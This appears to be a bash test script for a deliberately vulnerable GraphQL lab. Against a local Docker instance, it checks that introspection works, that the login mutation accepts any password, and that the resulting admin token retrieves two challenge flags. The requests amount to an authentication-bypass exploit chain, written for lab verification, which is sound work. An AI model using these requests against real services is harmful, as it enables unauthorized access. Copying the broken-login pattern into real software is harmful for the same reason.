#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8086 2>/dev/null; do sleep 1; done

# Test 1: homepage responds
check "homepage responds" "$(curl -sf http://127.0.0.1:8086/ >/dev/null 2>&1 && echo 1 || echo 0)"

# Test 2: introspection returns mutation list
OUT=$(curl -s -X POST http://127.0.0.1:8086/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ __schema { mutationType { fields { name } } } }"}' 2>/dev/null)
check "GraphQL introspection works (login mutation visible)" "$(echo "$OUT" | grep -q '"login"' && echo 1 || echo 0)"

# Test 3: broken login mutation -- any password works
OUT=$(curl -s -X POST http://127.0.0.1:8086/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"mutation { login(username:\"alice\",password:\"wrong\") { token flag } }"}' 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "login mutation bypasses auth and returns flag1" "$([ -n "$FLAG1" ] && echo 1 || echo 0)"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 4: get admin token
ADMIN_TOKEN=$(curl -s -X POST http://127.0.0.1:8086/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"mutation { login(username:\"admin\",password:\"x\") { token role } }"}' 2>/dev/null \
    | grep -oE '"token":"[^"]*"' | cut -d'"' -f4)
check "admin token obtained" "$([ -n "$ADMIN_TOKEN" ] && echo 1 || echo 0)"

# Test 5: adminPanel query returns flag2 with admin token
OUT=$(curl -s -X POST http://127.0.0.1:8086/graphql \
    -H 'Content-Type: application/json' \
    -H "X-Auth-Token: ${ADMIN_TOKEN}" \
    -d '{"query":"{ adminPanel { flag } }"}' 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "adminPanel returns flag2 with admin token" "$([ -n "$FLAG2" ] && echo 1 || echo 0)"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

# Test 6: adminPanel blocked without token
CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8086/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ adminPanel { flag } }"}' 2>/dev/null)
OUT2=$(curl -s -X POST http://127.0.0.1:8086/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ adminPanel { flag } }"}' 2>/dev/null)
check "adminPanel blocked without token" "$(echo "$OUT2" | grep -q '"errors"' && echo 1 || echo 0)"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
